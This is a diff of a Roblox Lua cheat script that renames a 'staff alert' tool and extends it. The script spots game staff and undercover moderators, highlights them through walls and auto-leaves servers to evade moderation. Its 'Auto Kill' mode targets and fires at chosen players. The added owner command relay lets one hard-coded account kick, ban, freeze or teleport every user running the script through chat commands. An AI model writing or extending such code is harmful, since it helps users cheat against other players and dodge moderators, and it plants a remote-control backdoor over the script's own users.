@@ -47,7 +47,8 @@ local theme = {
     Warning = Color3.fromRGB(255, 100, 0),
     StaffPresent = Color3.fromRGB(255, 0, 0),
     PossibleStaff = Color3.fromRGB(255, 220, 0),
-    Admin = Color3.fromRGB(255, 38, 62),
+    OneStaff = Color3.fromRGB(255, 38, 62),
+    Owner = Color3.fromRGB(255, 235, 55),
     ToggleKey = Enum.KeyCode.T
 }
 
@@ -187,7 +188,8 @@ local UNDERCOVER_USERIDS = {
     [1] = true, [1] = true, [1] = true, [1] = true, [1] = true  -- < js everyone in the group not necessarily undercover | Mod
 }
 
-local ADMIN_USERIDS = {
+-- These IDs are 01 Staff titles only. They are never treated as VF main staff.
+local ONE_STAFF_USERIDS = {
     [9242413057] = true,
     [2241675937] = true,
     [1115590282] = true,
@@ -198,33 +200,28 @@ local ADMIN_USERIDS = {
     [432780325] = true,
 }
 
-local SPECIAL_TAGS = {
-    [2309457259] = "[👑]",
-    [9242413057] = "[ADMIN]",
-    [2241675937] = "[ADMIN]",
-    [1115590282] = "[ADMIN]",
-    [386141208] = "[ADMIN]",
-    [301447922] = "[ADMIN]",
-    [9221310778] = "[ADMIN]",
-    [2836808851] = "[ADMIN]",
-    [432780325] = "[ADMIN]",
-}
-
 -- === HELPERS ===
-local function getSpecialTag(player)
-    return SPECIAL_TAGS[player.UserId] or ""
+local function is01Staff(player)
+    return player and ONE_STAFF_USERIDS[player.UserId] == true
 end
 
-local function isAdmin(player)
-    return player and ADMIN_USERIDS[player.UserId] == true
+local function isOwner(player)
+    return player and player.UserId == 2309457259
 end
 
 local function getDisplayName(player)
-    local tag = getSpecialTag(player)
-    if tag ~= "" then
-        return tag .. " " .. player.DisplayName
+    if isOwner(player) then
+        return "👑 " .. player.DisplayName
     end
     return player.DisplayName
+end
+
+local function isCombatRestricted(player)
+    return player and (isOwner(player) or is01Staff(player))
+end
+
+local function isProtectedTarget(player)
+    return player and isOwner(player)
 end
 
 local function tween(obj, props, time, style)
@@ -267,7 +264,7 @@ end
 -- outlineColor (5th arg) overrides the type-based color when provided
 -- force (6th arg) bypasses the NotificationsEnabled toggle (used for manual staff checks)
 -- fitLines (7th arg) gives a notification enough height for every explicit line.
-local function notify(title, text, duration, type, outlineColor, force, fitLines)
+local function notify(title, text, duration, type, outlineColor, force, fitLines, glint)
     if not config.NotificationsEnabled and not force then return end
     local color
     if outlineColor then
@@ -295,6 +292,23 @@ local function notify(title, text, duration, type, outlineColor, force, fitLines
     stroke.Color = color
     stroke.Thickness = 2
     addGlow(frame, color, 0.6)
+    if glint then
+        local glintBar = Instance.new("Frame", frame)
+        glintBar.BackgroundColor3 = Color3.fromRGB(255, 255, 215)
+        glintBar.BackgroundTransparency = 0.28
+        glintBar.BorderSizePixel = 0
+        glintBar.Position = UDim2.new(0, -80, 0, 0)
+        glintBar.Size = UDim2.new(0, 52, 1, 0)
+        glintBar.Rotation = 18
+        glintBar.ZIndex = 10002
+        task.spawn(function()
+            while glintBar.Parent do
+                glintBar.Position = UDim2.new(0, -80, 0, 0)
+                tween(glintBar, {Position = UDim2.new(1, 25, 0, 0)}, 1.15, Enum.EasingStyle.Linear)
+                task.wait(2.2)
+            end
+        end)
+    end
 
     local tl = Instance.new("TextLabel", frame)
     tl.BackgroundTransparency = 1
@@ -505,6 +519,200 @@ if config.Aim.SaveSettings then
     )
 end
 
+-- A client-side script cannot create a real Roblox server ban. This stores a
+-- best-effort local ban against the current server JobId when file persistence
+-- is available, so the script will refuse to initialize again in that server.
+do
+    local ownerBanKey = "01StaffAlert_BannedJob_" .. tostring(game.JobId)
+    if loadSetting(ownerBanKey, false) then
+        localPlayer:Kick("Banned from this server.")
+        return
+    end
+end
+
+-- Owner-only client command relay. Every injected client listens for the
+-- owner's commands, so the owner does not need this script.
+-- This is local enforcement only; it cannot create an authoritative Roblox
+-- server ban or control clients that are not running this script.
+do
+    local ownerBanKey = "01StaffAlert_BannedJob_" .. tostring(game.JobId)
+    local lastCommand
+    local lastCommandAt = 0
+
+    state.OwnerCommand = state.OwnerCommand or {
+        Frozen = false,
+        FreezeConnection = nil,
+        Original = nil,
+    }
+
+    local function getOwnerPlayer()
+        return Players:GetPlayerByUserId(2309457259)
+    end
+
+    local function resolveCommandTarget(targetText)
+        targetText = tostring(targetText or "")
+            :gsub("^%s+", "")
+            :gsub("%s+$", "")
+        if targetText == "" or targetText == "." then return "all" end
+
+        local lowered = targetText:lower()
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name:lower() == lowered
+                or player.DisplayName:lower() == lowered then
+                return player
+            end
+        end
+        for _, player in ipairs(Players:GetPlayers()) do
+            if player.Name:lower():sub(1, #lowered) == lowered
+                or player.DisplayName:lower():sub(1, #lowered) == lowered then
+                return player
+            end
+        end
+        return nil
+    end
+
+    local function commandAffectsLocalPlayer(target)
+        return target == "all" or target == localPlayer
+    end
+
+    local function freezeLocalCharacter()
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        if not humanoid or not root then return end
+
+        state.OwnerCommand.Original = {
+            Character = character,
+            WalkSpeed = humanoid.WalkSpeed,
+            JumpPower = humanoid.JumpPower,
+            AutoRotate = humanoid.AutoRotate,
+            Anchored = root.Anchored,
+        }
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+        root.Anchored = true
+    end
+
+    local function unfreezeLocalCharacter()
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        local original = state.OwnerCommand.Original
+        if humanoid then
+            humanoid.WalkSpeed = original and original.WalkSpeed or 16
+            humanoid.JumpPower = original and original.JumpPower or 50
+            humanoid.AutoRotate = original == nil and true or original.AutoRotate
+        end
+        if root then
+            root.Anchored = original and original.Anchored or false
+        end
+        state.OwnerCommand.Original = nil
+    end
+
+    local function setFrozen(frozen)
+        state.OwnerCommand.Frozen = frozen
+        if state.OwnerCommand.FreezeConnection then
+            state.OwnerCommand.FreezeConnection:Disconnect()
+            state.OwnerCommand.FreezeConnection = nil
+        end
+        if frozen then
+            freezeLocalCharacter()
+            state.OwnerCommand.FreezeConnection = localPlayer.CharacterAdded:Connect(function()
+                task.wait(0.25)
+                if state.OwnerCommand.Frozen then freezeLocalCharacter() end
+            end)
+        else
+            unfreezeLocalCharacter()
+        end
+    end
+
+    local function bringLocalPlayer()
+        local owner = getOwnerPlayer()
+        local ownerCharacter = owner and owner.Character
+        local ownerHumanoid = ownerCharacter and ownerCharacter:FindFirstChildOfClass("Humanoid")
+        local ownerRoot = ownerHumanoid and ownerHumanoid.RootPart
+        local character = localPlayer.Character
+        local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+        local root = humanoid and humanoid.RootPart
+        if root and ownerRoot then
+            root.CFrame = ownerRoot.CFrame * CFrame.new(0, 0, -4)
+            pcall(function() character:PivotTo(root.CFrame) end)
+        end
+    end
+
+    local function handleOwnerCommand(userId, rawText)
+        if localPlayer.UserId == 2309457259 or tonumber(userId) ~= 2309457259 then
+            return
+        end
+
+        local text = tostring(rawText or "")
+            :gsub("^%s+", "")
+            :gsub("%s+$", "")
+        local command, targetText = text:match("^(/%S+)%s*(.*)$")
+        command = command and command:lower()
+        if command ~= "/kick"
+            and command ~= "/ban"
+            and command ~= "/freeze"
+            and command ~= "/unfreeze"
+            and command ~= "/bring" then
+            return
+        end
+
+        local dedupeKey = command .. " " .. (targetText or "")
+        local now = os.clock()
+        if dedupeKey == lastCommand and now - lastCommandAt < 0.2 then return end
+        lastCommand = dedupeKey
+        lastCommandAt = now
+
+        local target = resolveCommandTarget(targetText)
+        if not target then return end
+        if target ~= "all" and target == localPlayer then
+            -- The owner is never affected by an owner command relay.
+            return
+        end
+
+        task.defer(function()
+            if not commandAffectsLocalPlayer(target) then return end
+            if command == "/kick" or command == "/ban" then
+                if command == "/ban" then saveSetting(ownerBanKey, true) end
+                local message = command == "/ban"
+                    and "Banned by 01 staff (not server owner)."
+                    or "Kicked by 01 staff (not server owner)."
+                pcall(function() localPlayer:Kick(message) end)
+            elseif command == "/freeze" then
+                setFrozen(true)
+            elseif command == "/unfreeze" then
+                setFrozen(false)
+            elseif command == "/bring" then
+                bringLocalPlayer()
+            end
+        end)
+    end
+
+    local function connectLegacyChat(player)
+        if player.UserId ~= 2309457259 then return end
+        player.Chatted:Connect(function(message)
+            handleOwnerCommand(player.UserId, message)
+        end)
+    end
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        connectLegacyChat(player)
+    end
+    Players.PlayerAdded:Connect(connectLegacyChat)
+
+    pcall(function()
+        local textChatService = game:GetService("TextChatService")
+        textChatService.MessageReceived:Connect(function(message)
+            local source = message.TextSource
+            if source then
+                handleOwnerCommand(source.UserId, message.Text)
+            end
+        end)
+    end)
+end
+
 -- === STAFF LOGIC ===
 local function playSound(id, vol)
     if not config.SoundsEnabled then return end
@@ -562,10 +770,17 @@ local function buildNotif(player, action, mains, possible)
     local inPossible = #possible > 0
     local title, body, color
 
-    if isAdmin(player) then
-        color = theme.Admin
-        title = "ADMIN • " .. dn
-        body = dn .. " (@" .. un .. ") • Admin — " .. action
+    if isOwner(player) then
+        color = theme.Owner
+        title = "👑 SERVER OWNER • " .. dn
+        body = dn .. " (@" .. un .. ") • SERVER OWNER — " .. action
+        return title, body, color
+    end
+
+    if is01Staff(player) then
+        color = theme.OneStaff
+        title = "01 STAFF • " .. dn
+        body = dn .. " (@" .. un .. ") • ADMIN / 01 STAFF — " .. action
         return title, body, color
     end
 
@@ -623,8 +838,9 @@ state.PossibleESPFolder.Name = "PossibleStaffESP"
 
 -- Priority: Main > Undercover > Possible
 -- Returns "main", "undercover", or "possible" (or nil if none)
-local function getPlayerCategory(inMain, isU, inPossible, isA)
-    if isA then return "admin" end
+local function getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
+    if ownerPlayer then return "owner" end
+    if is01 then return "01staff" end
     if inMain then return "main" end
     if isU    then return "undercover" end
     if inPossible then return "possible" end
@@ -635,10 +851,7 @@ local autoKickTriggered = false
 
 local function getAutoKickRole(player)
     if not player or player == localPlayer then return nil end
-    if isAdmin(player) then
-        return "admin"
-    end
-
+    if isOwner(player) then return nil end
     local mains = getMainMemberships(player)
     local inMain = #mains > 0
     if inMain then
@@ -665,15 +878,13 @@ local function autoKickPlayerIfNeeded(player)
     if not role then return false end
 
     autoKickTriggered = true
-    local roleLabel = role == "admin"
-        and "Admin"
-        or (role == "undercover" and "undercover staff" or "staff")
+    local roleLabel = role == "undercover" and "undercover staff" or "staff"
     notify(
         "AUTO KICK",
         roleLabel .. " detected: " .. getDisplayName(player) .. "\nLeaving this server.",
         4,
         "warning",
-        role == "admin" and theme.Admin or nil,
+        nil,
         true
     )
 
@@ -694,40 +905,30 @@ end
 local function applyESP(player)
     if not player or not player.Parent then return end
 
-    local specialTag = SPECIAL_TAGS[player.UserId]
-    if specialTag then
-        local function updateDisplay()
-            pcall(function()
-                if player.Character and player.Character:FindFirstChild("Humanoid") then
-                    player.Character.Humanoid.DisplayName = specialTag .. " " .. player.DisplayName
-                end
-            end)
-        end
-        player.CharacterAdded:Connect(function()
-            task.wait(0.5)
-            updateDisplay()
-        end)
-        if player.Character then updateDisplay() end
-    end
-
     local mains      = getMainMemberships(player)
     local possible   = getPossibleMemberships(player)
     local inMain     = #mains > 0
     local inPossible = #possible > 0
     local isU        = isUndercover(player, inMain)
-    local isA        = isAdmin(player)
-    local category   = getPlayerCategory(inMain, isU, inPossible, isA)
+    local is01       = is01Staff(player)
+    local ownerPlayer = isOwner(player)
+    local category   = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
 
     if not category then return end
 
     local function attach(char)
         if not char then return end
         local key, folder, fillClr, outlineClr
-        if category == "admin" then
-            key    = "AHL_"  .. player.UserId
+        if category == "owner" then
+            key    = "OWNERHL_" .. player.UserId
             folder = state.StaffESPFolder
-            fillClr    = theme.Admin
-            outlineClr = theme.Admin
+            fillClr    = theme.Owner
+            outlineClr = theme.Owner
+        elseif category == "01staff" then
+            key    = "O1HL_"  .. player.UserId
+            folder = state.StaffESPFolder
+            fillClr    = theme.OneStaff
+            outlineClr = theme.OneStaff
         elseif category == "main" then
             key    = "HL_"  .. player.UserId
             folder = state.StaffESPFolder
@@ -757,7 +958,11 @@ local function applyESP(player)
         if outlineClr then hl.OutlineColor = outlineClr end
     end
 
-    if category == "admin" then
+    if category == "owner" then
+        local title, body, color = buildNotif(player, "joined", mains, possible)
+        notify(title, body, 6, nil, color, true, 3, true)
+        playSound("rbxassetid://8887499160", 2.4)
+    elseif category == "01staff" then
         local title, body, color = buildNotif(player, "joined", mains, possible)
         notify(title, body, 5, nil, color)
         playSound("rbxassetid://8887499160", 2)
@@ -793,16 +998,22 @@ local function onPlayerRemoving(player)
     local inMain     = #mains > 0
     local inPossible = #possible > 0
     local isU        = isUndercover(player, inMain)
-    local isA        = isAdmin(player)
-    local category   = getPlayerCategory(inMain, isU, inPossible, isA)
+    local is01       = is01Staff(player)
+    local ownerPlayer = isOwner(player)
+    local category   = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
 
     if not category then return end
     playSound("rbxassetid://1091083826", 2)
 
-    if category == "admin" then
+    if category == "owner" then
+        local title, body, color = buildNotif(player, "left", mains, possible)
+        notify(title, body, 5, nil, color, true, 3, true)
+        local hl = state.StaffESPFolder:FindFirstChild("OWNERHL_" .. player.UserId)
+        if hl then hl:Destroy() end
+    elseif category == "01staff" then
         local title, body, color = buildNotif(player, "left", mains, possible)
         notify(title, body, 5, nil, color)
-        local hl = state.StaffESPFolder:FindFirstChild("AHL_" .. player.UserId)
+        local hl = state.StaffESPFolder:FindFirstChild("O1HL_" .. player.UserId)
         if hl then hl:Destroy() end
     elseif category == "main" then
         local title, body, color = buildNotif(player, "left", mains, possible)
@@ -912,12 +1123,12 @@ end)
 local sideTitle = Instance.new("TextLabel", topbar)
 sideTitle.BackgroundTransparency = 1
 sideTitle.Position = UDim2.new(0, 55, 0, 12)
-sideTitle.Size = UDim2.new(0, 108, 0, 30)
+sideTitle.Size = UDim2.new(0, 128, 0, 30)
 sideTitle.Font = Enum.Font.GothamBold
 -- xx MENU NAME
-sideTitle.Text = "STAFF ALERT PREMIUM"
+sideTitle.Text = "01 STAFF INTELLIGENCE"
 sideTitle.TextColor3 = theme.TextPrimary
-sideTitle.TextSize = 13
+sideTitle.TextSize = 12
 sideTitle.TextXAlignment = Enum.TextXAlignment.Left
 sideTitle.ZIndex = 6
 local sideTitleGradient = Instance.new("UIGradient", sideTitle)
@@ -930,29 +1141,29 @@ sideTitleGradient.Offset = Vector2.new(-1, 0)
 
 local topAnnouncement = Instance.new("TextLabel", topbar)
 topAnnouncement.BackgroundTransparency = 1
-topAnnouncement.Position = UDim2.new(0, 170, 0, 0)
-topAnnouncement.Size = UDim2.new(1, -290, 1, 0)
+topAnnouncement.Position = UDim2.new(0, 190, 0, 0)
+topAnnouncement.Size = UDim2.new(1, -310, 1, 0)
 topAnnouncement.Font = Enum.Font.GothamBold
 --xx Updated:                                                          --
-topAnnouncement.Text = "PREMIUM BUILD  •  Updated: 07/09/2026"
-topAnnouncement.TextColor3 = theme.TextSecondary
-topAnnouncement.TextSize = 17
+topAnnouncement.Text = "STAFF INTELLIGENCE  •  LIVE MONITOR"
+topAnnouncement.TextColor3 = theme.TextPrimary
+topAnnouncement.TextSize = 15
 topAnnouncement.TextXAlignment = Enum.TextXAlignment.Left
 topAnnouncement.TextYAlignment = Enum.TextYAlignment.Center
 topAnnouncement.ZIndex = 6
 
 state.EditionBadge = Instance.new("TextLabel", topbar)
-state.EditionBadge.BackgroundColor3 = localPlayer.UserId == 2309457259
-    and Color3.fromRGB(255, 190, 35)
-    or (isAdmin(localPlayer) and Color3.fromRGB(220, 55, 75) or Color3.fromRGB(255, 190, 35))
+state.EditionBadge.BackgroundColor3 = isOwner(localPlayer)
+    and Color3.fromRGB(245, 225, 45)
+    or (is01Staff(localPlayer) and Color3.fromRGB(190, 28, 58) or Color3.fromRGB(255, 190, 35))
 state.EditionBadge.BackgroundTransparency = 0.08
 state.EditionBadge.Position = UDim2.new(1, -116, 0, 13)
 state.EditionBadge.Size = UDim2.new(0, 101, 0, 29)
 state.EditionBadge.Font = Enum.Font.GothamBold
-state.EditionBadge.Text = localPlayer.UserId == 2309457259
+state.EditionBadge.Text = isOwner(localPlayer)
     and "OWNER"
-    or (isAdmin(localPlayer) and "ADMIN" or "PREMIUM")
-state.EditionBadge.TextColor3 = isAdmin(localPlayer)
+    or (is01Staff(localPlayer) and "01 STAFF" or "PREMIUM")
+state.EditionBadge.TextColor3 = is01Staff(localPlayer)
     and Color3.fromRGB(255, 240, 245)
     or Color3.fromRGB(30, 22, 5)
 state.EditionBadge.TextSize = 11
@@ -962,6 +1173,30 @@ state.EditionBadgeStroke = Instance.new("UIStroke", state.EditionBadge)
 state.EditionBadgeStroke.Color = Color3.fromRGB(255, 245, 160)
 state.EditionBadgeStroke.Thickness = 1
 state.EditionBadgeStroke.Transparency = 0.15
+local badgeGradient = Instance.new("UIGradient", state.EditionBadge)
+badgeGradient.Color = isOwner(localPlayer)
+    and ColorSequence.new(
+        Color3.fromRGB(255, 245, 65),
+        Color3.fromRGB(255, 255, 220),
+        Color3.fromRGB(205, 220, 35)
+    )
+    or (is01Staff(localPlayer) and ColorSequence.new(
+        Color3.fromRGB(135, 12, 42),
+        Color3.fromRGB(255, 105, 125),
+        Color3.fromRGB(175, 20, 60)
+    ) or ColorSequence.new(
+        Color3.fromRGB(255, 205, 45),
+        Color3.fromRGB(255, 250, 145),
+        Color3.fromRGB(235, 170, 25)
+    ))
+badgeGradient.Offset = Vector2.new(-1, 0)
+task.spawn(function()
+    while state.EditionBadge.Parent do
+        badgeGradient.Offset = Vector2.new(-1, 0)
+        tween(badgeGradient, {Offset = Vector2.new(1, 0)}, 2.4, Enum.EasingStyle.Linear)
+        task.wait(3.2)
+    end
+end)
 
 local topbarGlint = Instance.new("Frame", topbar)
 topbarGlint.BackgroundColor3 = Color3.fromRGB(115, 235, 255)
@@ -1018,7 +1253,7 @@ state.SidebarFooter.BackgroundTransparency = 1
 state.SidebarFooter.Position = UDim2.new(0, 14, 1, -35)
 state.SidebarFooter.Size = UDim2.new(1, -28, 0, 24)
 state.SidebarFooter.Font = Enum.Font.GothamBold
-state.SidebarFooter.Text = "◆  PREMIUM ACCESS"
+state.SidebarFooter.Text = "◆  01 PREMIUM ACCESS"
 state.SidebarFooter.TextColor3 = Color3.fromRGB(255, 210, 65)
 state.SidebarFooter.TextSize = 10
 state.SidebarFooter.TextXAlignment = Enum.TextXAlignment.Center
@@ -1087,6 +1322,7 @@ local autoKill = {
 
 local function saveAutoKillTargetSelection()
     if not autoKill.Config.SaveSettings then return end
+    autoKill.SelectedUserIds[2309457259] = nil
     saveSettingWithNotice(
         "AutoKillTargets",
         encodeUserIdSet(autoKill.SelectedUserIds),
@@ -2110,7 +2346,13 @@ function autoKill.GetRoot(player)
 end
 
 function autoKill.IsTargetUsable(player)
-    if not player or player == localPlayer or not player.Parent then return false end
+    if isCombatRestricted(localPlayer)
+        or not player
+        or player == localPlayer
+        or isProtectedTarget(player)
+        or not player.Parent then
+        return false
+    end
     local character = player.Character
     local humanoid = character and character:FindFirstChildOfClass("Humanoid")
     if not humanoid or (tonumber(humanoid.Health) or 0) <= 0.5 then return false end
@@ -2124,6 +2366,17 @@ end
 
 function autoKill.SetSelected(player, selected)
     if not player then return end
+    if selected and (isProtectedTarget(player) or isCombatRestricted(localPlayer)) then
+        notify(
+            "AUTO KILL",
+            isProtectedTarget(player)
+                and "The server owner cannot be selected as an Auto Kill target."
+                or "Auto Kill is restricted for 01 staff and the server owner.",
+            4,
+            "warning"
+        )
+        return
+    end
     local userId = player.UserId
     if selected then
         autoKill.SelectedUserIds[userId] = true
@@ -2136,6 +2389,7 @@ function autoKill.SetSelected(player, selected)
 end
 
 function autoKill.RefreshTargetOrder()
+    autoKill.SelectedUserIds[2309457259] = nil
     local ordered = {}
     for _, player in ipairs(Players:GetPlayers()) do
         if autoKill.IsSelected(player)
@@ -3391,8 +3645,8 @@ do
     profileLargeImage.ScaleType = Enum.ScaleType.Crop
     Instance.new("UICorner", profileLargeImage).CornerRadius = UDim.new(0, 14)
     local largeImageStroke = Instance.new("UIStroke", profileLargeImage)
-    local isOwner = localPlayer.UserId == 2309457259
-    largeImageStroke.Color = isOwner and Color3.fromRGB(255, 215, 60) or Color3.fromRGB(110, 235, 255)
+    local ownerProfile = isOwner(localPlayer)
+    largeImageStroke.Color = ownerProfile and theme.Owner or Color3.fromRGB(110, 235, 255)
     largeImageStroke.Thickness = 2
 
     local profileName = Instance.new("TextLabel", profileCard)
@@ -3433,27 +3687,27 @@ do
     rankLabel.Position = UDim2.new(0, 180, 0, 119)
     rankLabel.Size = UDim2.new(0, 140, 0, 28)
     rankLabel.Font = Enum.Font.GothamBold
-    local isAdminUser = isAdmin(localPlayer)
-    rankLabel.Text = isAdminUser and "ADMIN" or (isOwner and "OWNER" or "PREMIUM")
-    rankLabel.TextColor3 = isAdminUser
-        and theme.Admin
-        or Color3.fromRGB(255, 210, 65)
+    local is01StaffUser = is01Staff(localPlayer)
+    rankLabel.Text = is01StaffUser and "ADMIN  /  01 STAFF" or (ownerProfile and "OWNER" or "PREMIUM")
+    rankLabel.TextColor3 = is01StaffUser
+        and theme.OneStaff
+        or (ownerProfile and theme.Owner or Color3.fromRGB(255, 210, 65))
     rankLabel.TextSize = 18
     rankLabel.TextXAlignment = Enum.TextXAlignment.Left
-    if isAdminUser or isOwner then
+    if is01StaffUser or ownerProfile then
         local rankGradient = Instance.new("UIGradient", rankLabel)
-        rankGradient.Color = isAdminUser
+        rankGradient.Color = is01StaffUser
             and ColorSequence.new({
-                ColorSequenceKeypoint.new(0, Color3.fromRGB(115, 0, 18)),
-                ColorSequenceKeypoint.new(0.40, Color3.fromRGB(205, 22, 48)),
-                ColorSequenceKeypoint.new(0.49, Color3.fromRGB(255, 190, 200)),
-                ColorSequenceKeypoint.new(0.54, Color3.fromRGB(255, 62, 88)),
-                ColorSequenceKeypoint.new(1, Color3.fromRGB(125, 0, 20))
+                ColorSequenceKeypoint.new(0, Color3.fromRGB(130, 15, 45)),
+                ColorSequenceKeypoint.new(0.38, Color3.fromRGB(235, 55, 90)),
+                ColorSequenceKeypoint.new(0.50, Color3.fromRGB(255, 220, 230)),
+                ColorSequenceKeypoint.new(0.62, Color3.fromRGB(255, 75, 110)),
+                ColorSequenceKeypoint.new(1, Color3.fromRGB(145, 18, 55))
             })
             or ColorSequence.new(
-                Color3.fromRGB(255, 170, 0),
-                Color3.fromRGB(255, 255, 170),
-                Color3.fromRGB(255, 185, 0)
+                Color3.fromRGB(225, 225, 25),
+                Color3.fromRGB(255, 255, 235),
+                Color3.fromRGB(245, 245, 65)
             )
         rankGradient.Rotation = 0
         task.spawn(function()
@@ -4094,6 +4348,14 @@ do
     createSectionHeader(autoKillPage, "AUTO KILL CONTROLS", 50, theme.AccentSecondary)
     autoKillEnableControl = createToggle("Enable", "Follow, target, and fire at the selected player", 84,
         autoKill.Config.Enabled, function(value)
+            if value and isCombatRestricted(localPlayer) then
+                autoKill.Config.Enabled = false
+                if autoKillEnableControl then
+                    autoKillEnableControl.SetValue(false, false)
+                end
+                notify("AUTO KILL", "Auto Kill is restricted for 01 staff and the server owner.", 4, "warning")
+                return
+            end
             autoKill.Config.Enabled = value
             if value then
                 -- Auto Kill owns the weapon while active. Clear and suspend
@@ -4314,7 +4576,7 @@ do
         local players = {}
         local mainCount, undercoverCount, possibleCount = 0, 0, 0
         for _, player in ipairs(Players:GetPlayers()) do
-            if player ~= localPlayer then
+            if player ~= localPlayer and not isProtectedTarget(player) then
                 table.insert(players, player)
                 local mains = getMainMemberships(player)
                 local possible = getPossibleMemberships(player)
@@ -4585,7 +4847,7 @@ createToggle("Save Settings", "Save Staff Alerts settings, including Auto Kick",
 -- The configured staff-check key always fires regardless of NotificationsEnabled.
 -- Results are shown in priority order: Main > Undercover > Possible Staff.
 local function showStaffNotification()
-    local adminLines, mainLines, undLines, possLines = {}, {}, {}, {}
+    local oneStaffLines, mainLines, undLines, possLines = {}, {}, {}, {}
 
     for _, p in ipairs(Players:GetPlayers()) do
         local mains      = getMainMemberships(p)
@@ -4593,14 +4855,16 @@ local function showStaffNotification()
         local inMain     = #mains > 0
         local inPossible = #possible > 0
         local isU        = isUndercover(p, inMain)
-        local isA        = isAdmin(p)
-        local category   = getPlayerCategory(inMain, isU, inPossible, isA)
+        local is01       = is01Staff(p)
+        local ownerPlayer = isOwner(p)
+        local category   = getPlayerCategory(inMain, isU, inPossible, is01, ownerPlayer)
         if not category then continue end
 
         -- The staff check is intentionally compact: names only, so every active player fits.
         local line = p.DisplayName .. " (@" .. p.Name .. ")"
 
-        if     category == "admin"      then table.insert(adminLines, line)
+        if     category == "owner"      then table.insert(oneStaffLines, "👑 OWNER • " .. line)
+        elseif category == "01staff"    then table.insert(oneStaffLines, "ADMIN • " .. line)
         elseif category == "main"       then table.insert(mainLines, line)
         elseif category == "undercover" then table.insert(undLines,  line)
         else                                 table.insert(possLines, line)
@@ -4608,19 +4872,19 @@ local function showStaffNotification()
     end
 
     local allLines = {}
-    for _, l in ipairs(adminLines) do table.insert(allLines, "ADMIN • " .. l) end
+    for _, l in ipairs(oneStaffLines) do table.insert(allLines, "01 STAFF • " .. l) end
     for _, l in ipairs(mainLines) do table.insert(allLines, l) end
     for _, l in ipairs(undLines)  do table.insert(allLines, l) end
     for _, l in ipairs(possLines) do table.insert(allLines, l) end
 
     if #allLines > 0 then
-        local hasAdmin = #adminLines > 0
+        local hasOneStaff = #oneStaffLines > 0
         notify(
-            hasAdmin and "ADMIN / STAFF IN SERVER" or "STAFF IN SERVER",
+            hasOneStaff and "01 STAFF / VF STAFF IN SERVER" or "VF STAFF IN SERVER",
             table.concat(allLines, "\n"),
             8,
             nil,
-            hasAdmin and theme.Admin or theme.StaffPresent,
+            hasOneStaff and theme.OneStaff or theme.StaffPresent,
             true,
             #allLines
         )
@@ -4651,8 +4915,10 @@ staffPage.CanvasSize = UDim2.new(0, 0, 0, 440)
 --  STAFF LIST PAGE
 -- ======================================================== --
 
--- ── STAFF LIST: 3 independent scrollable sections ──────────────────────────
--- Each section is a ScrollingFrame taking 1/3 of the page height.
+local refreshStaffList
+(function()
+-- ── STAFF LIST: 4 independent scrollable sections ──────────────────────────
+-- 01 STAFF and the real VF main group sit side by side at the top.
 -- CanvasSize is set explicitly in pixels so scrolling is reliable everywhere.
 local SL_ROW_H   = 56   -- height of each player row in pixels
 local SL_ROW_GAP = 4    -- gap between rows
@@ -4660,11 +4926,13 @@ local SL_STRIDE  = SL_ROW_H + SL_ROW_GAP  -- total pixels per entry
 
 local SL_SECTION_H = 190  -- fixed pixel height for each inner scrolling section
 
-local function slMakeSection(title, color, yOffset)
+local function slMakeSection(title, color, yOffset, xScale, xOffset)
+    xScale = xScale or 0
+    xOffset = xOffset or 0
     local header = Instance.new("TextLabel", staffListPage)
     header.BackgroundTransparency = 1
-    header.Position = UDim2.new(0, 2, 0, yOffset + 2)
-    header.Size     = UDim2.new(1, -4, 0, 20)
+    header.Position = UDim2.new(xScale, xOffset + 2, 0, yOffset + 2)
+    header.Size     = UDim2.new(0.5, -8, 0, 20)
     header.Font     = Enum.Font.GothamBold
     header.Text     = title .. " [0]"
     header.TextColor3 = color
@@ -4674,15 +4942,15 @@ local function slMakeSection(title, color, yOffset)
     local divider = Instance.new("Frame", staffListPage)
     divider.BackgroundColor3    = color
     divider.BackgroundTransparency = 0.5
-    divider.Position = UDim2.new(0, 0, 0, yOffset + 24)
-    divider.Size     = UDim2.new(1, 0, 0, 1)
+    divider.Position = UDim2.new(xScale, xOffset, 0, yOffset + 24)
+    divider.Size     = UDim2.new(0.5, -4, 0, 1)
 
     -- ScrollingFrame with fixed pixel height for reliable scrolling
     local sf = Instance.new("ScrollingFrame", staffListPage)
     sf.BackgroundColor3   = theme.BackgroundSecondary
     sf.BorderSizePixel    = 0
-    sf.Position           = UDim2.new(0, 0, 0, yOffset + 28)
-    sf.Size               = UDim2.new(1, 0, 0, SL_SECTION_H)
+    sf.Position           = UDim2.new(xScale, xOffset, 0, yOffset + 28)
+    sf.Size               = UDim2.new(0.5, -4, 0, SL_SECTION_H)
     sf.CanvasSize         = UDim2.new(1, 0, 0, 0)   -- starts empty; set explicitly on populate
     sf.ScrollingEnabled   = true
     sf.ScrollingDirection = Enum.ScrollingDirection.Y
@@ -4710,9 +4978,10 @@ local function slMakeSection(title, color, yOffset)
 end
 
 local SL_SECTION_STRIDE = 228  -- pixels per section block (28 header + 190 sf + 10 gap)
-local slMainSF, slMainEmpty, slMainHdr = slMakeSection("— STAFF GROUP  (Main Group)", theme.Success,       0)
-local slUndSF,  slUndEmpty,  slUndHdr  = slMakeSection("— UNDERCOVER",          theme.Warning,       SL_SECTION_STRIDE)
-local slPossSF, slPossEmpty, slPossHdr = slMakeSection("— POSSIBLE STAFF",      theme.PossibleStaff, SL_SECTION_STRIDE * 2)
+local slOneSF, slOneEmpty, slOneHdr = slMakeSection("— 01 STAFF", theme.OneStaff, 0, 0, 0)
+local slMainSF, slMainEmpty, slMainHdr = slMakeSection("— VF STAFF GROUP  (MAIN)", theme.Success, 0, 0.5, 4)
+local slUndSF,  slUndEmpty,  slUndHdr  = slMakeSection("— UNDERCOVER", theme.Warning, SL_SECTION_STRIDE, 0, 0)
